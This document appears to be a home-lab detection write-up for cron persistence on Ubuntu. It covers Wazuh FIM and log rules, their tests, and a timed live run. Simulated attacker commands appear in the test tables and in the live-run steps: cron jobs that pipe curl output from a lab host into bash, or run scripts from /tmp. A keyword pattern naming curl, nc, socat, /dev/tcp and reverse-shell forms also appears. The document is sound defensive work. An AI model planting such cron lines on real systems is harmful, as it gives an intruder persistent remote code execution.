# 03: Cron persistence

- **ATT&CK technique:** T1053.003 Scheduled Task/Job: Cron
- **Rule type:** Built-in Wazuh rules 554, 550, 2832, 2833, 2834 / Custom rules 100120–100123
- **Simulation:** [`../simulations/03-cron-persistence.md`](../simulations/03-cron-persistence.md)

## Logic

An attacker adds a cron job so their code runs again after a reboot or a lost session. Two ways in on Ubuntu:

- **System cron files** (root): a new file in `/etc/cron.d/`, a line appended to `/etc/crontab`, or a script in `/etc/cron.{hourly,daily,weekly,monthly}/`.
- **User crontab**: `crontab -e` or `crontab FILE`, stored in `/var/spool/cron/crontabs/<user>`. Works as `labuser`, no root needed.

Detection uses FIM first, logs second:

1. **FIM (who-data, with `report_changes`)** on all those paths ([`agent.conf`](../configs/endpoint/agent.conf)). Fires within seconds, gives the writing process and the human login user, and for modified files the diff of the new line.
2. **crontab log lines (journald):** `crontab[PID]: (user) BEGIN EDIT / REPLACE / END EDIT (owner)`.
3. **cron daemon log lines:** every time a job runs, `CRON[PID]: (user) CMD (command)`. This is evidence of execution, not just of planting. (Ubuntu 24.04 cron does **not** log `RELOAD` at its default level: none appeared in the live run.)

Built-in:

| Rule | Level | Matches |
|---|---|---|
| 554 | 5 | FIM: file added (any monitored path) |
| 550 | 7 | FIM: checksum changed (any monitored path) |
| 553 | 7 | FIM: file deleted (clean-up after the job ran) |
| 2834 | 5 | `crontab`: `BEGIN EDIT` |
| 2832 | 5 | `crontab`: `REPLACE` (a crontab was installed) |
| 2833 | 8 | `REPLACE (root)`: root's own crontab replaced |

Gaps:
- 554/550 are generic: a new cron job looks the same as any changed file in `/etc` (level 5/7).
- **Ubuntu's daemon logs as `CRON`, not `crond`.** Built-in group 2830 is `crond|crontab`, so the job-start `CMD` lines match no rule at all (checked with wazuh-logtest on the live lines). The cron PAM session lines are dropped on purpose by built-in 5521 (level 0).
- `(root) REPLACE (labuser)` (root editing someone else's crontab) stays at level 5.
- Nothing looks at **what** the job runs.

Custom rules:

| Rule | Level | Matches |
|---|---|---|
| **100120** | **10** | 550 or 554 where `file` is `/etc/crontab`, `/etc/cron.{d,hourly,daily,weekly,monthly}/…` or `/var/spool/cron/…` |
| **100121** | **13** | child of 100120, the diff (`changed_content`) contains `curl`, `wget`, `nc`, `ncat`, `socat`, `/dev/tcp/`, `bash -i`, `sh -i`, `python -c`, `perl -e`, `base64`, `/tmp/` or `/dev/shm/` |
| **100122** | **12** | program `CRON`, `(user) CMD (…)` containing the same keywords as 100121: a planted job **ran** |
| 100123 | 8 | child of 2832, `(root) REPLACE` or `REPLACE (root)` |

**Limitation of 100121:** Wazuh sends no diff for a **newly added** file, only for modified ones. A brand-new `/etc/cron.d/evil` stops at 100120 (level 10); the analyst opens the file on the VM. Appending to `/etc/crontab` or editing an existing user crontab gets the diff and 100121. A user's **first** `crontab -e` creates the file (554, no diff); later edits modify it (550, diff).

## Rule

From [`../configs/wazuh-rules/local_rules.xml`](../configs/wazuh-rules/local_rules.xml):

```xml
<rule id="100120" level="10">
  <if_sid>550,554</if_sid>
  <field name="file" type="pcre2">^(/etc/crontab$|/etc/cron\.(d|hourly|daily|weekly|monthly)/|/var/spool/cron/)</field>
  <description>SOC lab: cron file added or changed: $(file).</description>
  <mitre><id>T1053.003</id></mitre>
</rule>

<rule id="100121" level="13">
  <if_sid>100120</if_sid>
  <field name="changed_content" type="pcre2">(?i)(curl|wget|\bnc\b|ncat|socat|/dev/tcp/|bash -i|sh -i|python[0-9.]* -c|perl -e|base64|/tmp/|/dev/shm/)</field>
  <description>SOC lab: cron change contains a download, shell or temp-dir command: $(file).</description>
  <mitre><id>T1053.003</id><id>T1059.004</id></mitre>
</rule>

<rule id="100122" level="12">
  <program_name>^CRON$</program_name>
  <regex type="pcre2">^\(\S+\) CMD \(.*(curl|wget|\bnc\b|ncat|socat|/dev/tcp/|bash -i|sh -i|python[0-9.]* -c|perl -e|base64|/tmp/|/dev/shm/)</regex>
  <description>SOC lab: cron ran a download, shell or temp-dir command.</description>
</rule>
```

FIM field names in rules: `file` = `syscheck.path`, `changed_content` = `syscheck.diff`. They were confirmed in the analysisd binary and by the sandbox test below.

## Testing

**Log rules, wazuh-logtest 2026-11-06** (custom rules in the offline sandbox container, see 01):

| Input | Built-in | With custom |
|---|---|---|
| `crontab[4010]: (labuser) BEGIN EDIT (labuser)` | 2834 L5 | 2834 L5 |
| `crontab[4010]: (labuser) REPLACE (labuser)` | 2832 L5 | 2832 L5 |
| `crontab[4140]: (root) REPLACE (labuser)` | 2832 L5 | **100123 L8** |
| `crontab[4141]: (root) REPLACE (root)` | 2833 L8 | 2833 L8 |
| `CRON[2265]: (root) CMD (curl -s http://192.168.64.1/p \| bash)` (real line from the live run) | **no alert** | **100122 L12** |
| `CRON[2263]: (root) CMD (/tmp/eviltask.sh)` (live) | **no alert** | **100122 L12** |
| `CRON[2240]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)` (normal sysstat job) | no alert | no alert |

The first version of 100122 matched `cron[…]: … RELOAD (…)` lines, which were assumed rather than observed. The live run (below) showed Ubuntu 24.04 never writes them at the default log level, so on 2026-11-10 the rule was rewritten to match the `CMD` lines and re-tested in the sandbox.

**FIM rules, sandbox only.** wazuh-logtest can't take FIM events, so synthetic who-data FIM events (4.14 agent message format) were sent straight into the sandbox manager's analysis queue and `alerts.json` was read back. The live manager was not touched.

| Synthetic FIM event | Alert |
|---|---|
| `/etc/cron.d/evil` added by `/usr/bin/cp`, login user `<admin>` | **100120 L10** |
| `/etc/crontab` modified, diff `> * * * * * root curl -s http://192.168.64.1/x.sh \| bash` | **100121 L13** |
| `/var/spool/cron/crontabs/labuser` modified by `crontab`, diff `> */5 * * * * /tmp/.x` | **100121 L13** |
| same file, diff `> 0 3 * * * /home/labuser/backup.sh` | 100120 L10 |
| `/etc/logrotate.d/apt` modified by dpkg (control) | 550 L7 (not raised) |

Already seen live in Phase 1: `/etc/cron.d/soc-lab-test` gave 554 then 553, mode whodata, with the admin as login user.

### Live run, 2026-11-10

Run by the admin through sudo, about 01:25 UTC:
1. `echo '* * * * * root curl -s http://192.168.64.1/p | bash' | sudo tee /etc/cron.d/soc-lab-persist` (create)
2. `echo '*/5 * * * * root /tmp/beacon base64 -d' | sudo tee -a /etc/cron.d/soc-lab-persist` (append)
3. `(sudo crontab -l; echo '* * * * * /tmp/eviltask.sh') | sudo crontab -` (root's first crontab)

| Time (UTC) | Alert | What |
|---|---|---|
| 01:25:53 | **100120 L10** | `/etc/cron.d/soc-lab-persist` **added** (whodata, process `tee`, login user `<admin>`). No diff, because it's a new file |
| 01:25:53 | **100121 L13** | same file **modified**. The diff with the appended `/tmp/beacon … base64` line is what matched |
| 01:25:53 | **100120 L10** | `/var/spool/cron/crontabs/root` **added**: root's first crontab, so no diff and no 100121, even though it contains `/tmp/eviltask.sh` |
| 01:25:5x | 2833 L8 | `crontab: (root) REPLACE (root)` |
| 01:26:01, 01:27:01, 01:28:01 | _not alerted (rule rewritten afterwards, then confirmed live: see below)_ | `CRON: (root) CMD (curl -s http://192.168.64.1/p \| bash)` and `CMD (/tmp/eviltask.sh)` in archives: **both planted jobs ran** every minute until cleanup. The rewritten 100122 alerts on exactly these lines |

**Timeline:** planted at 01:25:53, detected the same second (FIM), first executed at 01:26:01. Detection came before execution, but only by seconds, so for cron persistence the response is "remove the job and check what it ran", not "block it first".

**Why 100123 didn't fire:** 100123 and built-in 2833 are both children of 2832. For `(root) REPLACE (root)` Wazuh checks 2833 first (built-in rules load before local ones) and stops at the first child that matches. So the alert is 2833 (level 8, the same as 100123), and 100123 only adds the case 2833 misses: root replacing **another user's** crontab, `(root) REPLACE (labuser)` (logtest: 100123 L8).

**Gap shown by step 3:** a first-ever crontab (or any brand-new cron file) gets 100120 but no content check. The content shows up only when the job runs, which is now 100122.

### 100122 confirmed live, 2026-11-10

A harmless job, `* * * * * root /tmp/soc-lab-noop`, was written to `/etc/cron.d/soc-lab-noop` with `sudo tee`. `/tmp/soc-lab-noop` doesn't exist, so nothing ran, but cron still logs the `CMD` line.

| Time (UTC) | Alert | What |
|---|---|---|
| 03:16:03 | 100120 L10 | `/etc/cron.d/soc-lab-noop` added, process `/usr/bin/tee` |
| 03:17:03 | **100122 L12** | `CRON[8979]: (root) CMD (/tmp/soc-lab-noop)`: matched `/tmp/` |
| 03:18:03 | **100122 L12** | `CRON[8996]`: the next minute's run, one alert per run as expected |
| 03:18:21 | 553 L7 | file deleted by `/usr/bin/rm` (cleanup) |

So the gap left by a new cron file (100120 with no content check) is now closed within a minute: the first run of the job gives 100122 with the command in `full_log`.

Deleting the file gave built-in **553**, not 100120, because 100120 is a child of 550/554 only. Removing a cron file is usually cleanup. An attacker deleting a legitimate job (to stop a backup or a security scan) would appear only as 553 L7. If that matters, add 553 to 100120's `if_sid`, at the cost of an extra L10 for every cleanup.

## How to verify

**Dashboard:**

```
agent.name:soc-victim-01 and (rule.id:(100120 or 100121 or 100122 or 100123 or 2832 or 2833 or 2834) or (rule.id:(550 or 553 or 554) and syscheck.path:*cron*))
```

Expected:
- **100120** or **100121** with `syscheck.path` (e.g. `/etc/cron.d/<name>` or `/var/spool/cron/crontabs/labuser`), `syscheck.event` (`added`/`modified`), `syscheck.mode: whodata`, `syscheck.audit.login_user.name` (`<admin>` for root cron via sudo, `labuser` for user crontab), `syscheck.audit.process.name` (`/usr/bin/crontab`, an editor, `tee`, `cp`…), and `syscheck.diff` for modified files;
- for `crontab -e`: **2834** → **2832** (or 100123 for root) from journald;
- **100122** at the next minute boundary, once per run of the job, with the command in `full_log`.

**Indexer:** same `curl` as in [01](01-ssh-brute-force.md#how-to-verify), with this rule list and `_source` adding `syscheck.path`, `syscheck.event`, `syscheck.diff`, `syscheck.audit.login_user.name`, `syscheck.audit.process.name`.

**Endpoint cross-check:**

```bash
# [VM]
sudo ls -la /etc/cron.d /var/spool/cron/crontabs
sudo crontab -l -u labuser
sudo journalctl -t cron -t crontab --since "30 min ago" --no-pager
```

## False positives and tuning

- **Package installs and upgrades** drop files into `/etc/cron.d` and `/etc/cron.daily` (e.g. `e2scrub_all`, `sysstat`, `logrotate`). These give 100120 with `syscheck.audit.process.name: /usr/bin/dpkg`. Option if it gets noisy: a child of 100120 at level 5 for `process_name` `/usr/bin/dpkg`. Not added yet, because a malicious `.deb` would also be dpkg, and it's rare on this VM.
- **100121 keyword list** is broad on purpose (`/tmp/`, `base64`, `curl`). A real backup job that uses `curl` to upload would hit it: tune per job with a child rule matching the exact line, never by dropping the keyword.
- **100122 fires every time the job runs**: a planted `* * * * *` job gives one alert a minute until it's removed. That's a useful "still active" signal during triage, but it's noisy. Lab jobs that legitimately use `curl` or `/tmp/` need a child rule matching the exact command. `/dev/null` doesn't match (normal jobs redirect to it).
- **Not covered:** systemd timers (T1053.006), `at` jobs (T1053.002), `@reboot` lines in a file that FIM missed during an agent restart (see the agent-restart note in [`../docs/endpoints.md`](../docs/endpoints.md); a full scan every 12 h picks it up as 550/554 later).
